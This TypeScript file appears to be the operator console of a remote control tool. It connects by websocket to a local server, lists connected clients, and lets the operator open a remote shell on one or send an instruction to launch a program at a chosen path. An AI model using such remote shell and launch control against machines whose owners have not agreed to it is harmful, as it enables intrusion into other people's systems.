import ws from "ws";
import { InstructionInterface } from '../server/interfaces/remote/instruction';
import { getClients } from './request/client_getter';
import { verifySocket } from './request/verify_socket';
import { getBasicInfo } from "./ui/getBasicInfo";
import { getPath } from "./ui/getPath";
import { runShell } from './ui/shell';

const conn = new ws("ws://localhost:3000")

conn.on("open", async () => {
  console.log("Verifying socket...")
  const res = await verifySocket(conn);
  if (!res) {
    conn.close();
    process.exit(0);
  }

  try {
    let execute = true;

    while (execute) {
      console.log("Getting clients...")
      let clients: string[] = await getClients(conn);

      console.log("Asking you questions...")
      const basicInfo = await getBasicInfo(clients);

      if (basicInfo.type === "shell")
        await runShell(conn, basicInfo.client);

      if (basicInfo.type === "launch") {
        const path = await getPath();
        const response: InstructionInterface = {
          name: "instruction",
          data: {
            client: basicInfo.client,
            exec_type: "launch",
            path: path
          }
        }

        conn.send(JSON.stringify(response));
        console.log("Launch request sent.")
      }
    }
  } catch (e) {
    console.log("Couldn't execute", e?.stack ?? e)
  }
})